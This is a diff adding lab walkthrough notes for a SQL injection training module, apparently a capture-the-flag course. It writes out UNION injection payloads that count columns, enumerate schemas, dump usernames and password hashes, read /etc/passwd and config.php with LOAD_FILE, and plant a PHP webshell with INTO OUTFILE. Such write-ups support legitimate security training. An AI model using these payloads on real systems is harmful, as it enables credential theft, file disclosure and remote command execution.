@@ -94,17 +94,109 @@ PW: anything...
 
 ### Union Clause
 
+**Connect to the above MySQL server with the 'mysql' tool, and find the number of records returned when doing a 'Union' of all records in the 'employees' table and all records in the 'departments' table.**
 
+`mysql -u root -h 83.136.251.235 -P 47496 -p`
+
+`show databases;`
+
+`use employees;`
+
+`select * from employees UNION select dept_no, dept_name, 3, 4, 5, 6 from departments;`
+
+<figure><img src=".gitbook/assets/image (146).png" alt=""><figcaption></figcaption></figure>
 
 ### Union Injection
+
+* we can detect number of columns
+  * using ORDER BY or UNION
+    * ' order by 1-- -
+    * cn' UNION select 1,2,3-- -
+      * cn' UNION select 1,@@version,3,4-- -
+        *
+
+            <figure><img src=".gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>
+
+
+
+**Use a Union injection to get the result of 'user()'**
+
+* go to given URL
+* replicate the last example
+* `cn' UNION select 1,user(),3,4-- -`
+
+<figure><img src=".gitbook/assets/image (148).png" alt=""><figcaption></figcaption></figure>
 
 ## Exploitation
 
 ### DB Enumeration
 
+**What is the password hash for 'newuser' stored in the 'users' table in the 'ilfreight' database?**
+
+`cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -`
+
+<figure><img src=".gitbook/assets/image (149).png" alt=""><figcaption></figcaption></figure>
+
+`cn' UNION select 1,database(),2,3-- -`
+
+<figure><img src=".gitbook/assets/image (150).png" alt=""><figcaption></figcaption></figure>
+
+`cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -`
+
+<figure><img src=".gitbook/assets/image (151).png" alt=""><figcaption></figcaption></figure>
+
+`cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -`
+
+<figure><img src=".gitbook/assets/image (152).png" alt=""><figcaption></figcaption></figure>
+
+`cn' UNION select 1, username, password, 4 from dev.credentials-- -`
+
+<figure><img src=".gitbook/assets/image (153).png" alt=""><figcaption></figcaption></figure>
+
+`cn' UNION select 1, username, password, 4 from`` `**`users`**`-- -`
+
+<figure><img src=".gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>
+
 ### Reading Files
 
+**We see in the above PHP code that '$conn' is not defined, so it must be imported using the PHP include command. Check the imported page to obtain the database password.**
+
+`cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`
+
+<figure><img src=".gitbook/assets/image (155).png" alt=""><figcaption></figcaption></figure>
+
+`cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -`
+
+<figure><img src=".gitbook/assets/image (156).png" alt=""><figcaption></figcaption></figure>
+
+* inspect soucre code
+  * config.php
+
+<figure><img src=".gitbook/assets/image (157).png" alt=""><figcaption></figcaption></figure>
+
+`cn' UNION SELECT 1, LOAD_FILE("/var/www/html/`**`config.php`**`"), 3, 4-- -`
+
+<figure><img src=".gitbook/assets/image (158).png" alt=""><figcaption></figcaption></figure>
+
 ### Writing Files&#x20;
+
+**Find the flag by using a webshell.**
+
+* HINT: Its one directoy away from you
+
+`<?php system($_REQUEST[0]); ?>`
+
+`cn' union select "",'', "", "" into outfile '/var/www/html/shell.php'-- -`
+
+URL: [http://83.136.251.235:41930/shell.php?0=id](http://83.136.251.235:41930/shell.php?0=id)
+
+<figure><img src=".gitbook/assets/image (159).png" alt=""><figcaption></figcaption></figure>
+
+`cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -`
+
+<figure><img src=".gitbook/assets/image (160).png" alt=""><figcaption></figcaption></figure>
+
+cn' union select "",'', "", "" into outfile '/var/www/html/shell2.php'-- -
 
 ## Mitigations&#x20;
 
